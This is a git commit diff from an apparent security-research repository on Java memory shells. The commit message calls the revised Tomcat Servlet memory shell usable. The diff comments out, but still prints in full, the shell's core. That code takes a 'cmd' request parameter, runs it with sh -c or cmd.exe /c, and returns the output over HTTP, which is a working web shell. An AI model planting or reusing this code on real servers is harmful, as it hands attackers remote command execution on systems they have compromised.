b0156f82574cab15dff96b08dfe1eb19c4c31f2f
233 <ayusummer233@vip.qq.com>
2024-09-29 18:56:07 +0800

    ✨ 再改一版 Tomcat Servlet 内存马 - 可以用

--- Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/SummerCMDServlet.java
+++ Security/Web/MemShell/Java/Tomcat/ServletAPI/Servlet/addServlet/dynamic-add-servlet/src/main/java/com/summer233/SummerCMDServlet.java
@@ -49,20 +49,20 @@ public class SummerCMDServlet implements Servlet {
          servletResponse.getWriter().close();
       }
 
-      String cmd = servletRequest.getParameter("cmd");
-      boolean isLinux = true;
-      String osTyp = System.getProperty("os.name");
-      if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-         isLinux = false;
-      }
-      String[] cmds = isLinux ? new String[] { "sh", "-c", cmd } : new String[] { "cmd.exe", "/c", cmd };
-      InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-      Scanner s = new Scanner(in).useDelimiter("\\a");
-      String output = s.hasNext() ? s.next() : "";
-      PrintWriter out = servletResponse.getWriter();
-      out.println(output);
-      out.flush();
-      out.close();
+      // String cmd = servletRequest.getParameter("cmd");
+      // boolean isLinux = true;
+      // String osTyp = System.getProperty("os.name");
+      // if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+      //    isLinux = false;
+      // }
+      // String[] cmds = isLinux ? new String[] { "sh", "-c", cmd } : new String[] { "cmd.exe", "/c", cmd };
+      // InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+      // Scanner s = new Scanner(in).useDelimiter("\\a");
+      // String output = s.hasNext() ? s.next() : "";
+      // PrintWriter out = servletResponse.getWriter();
+      // out.println(output);
+      // out.flush();
+      // out.close();
    }
 
    @Override
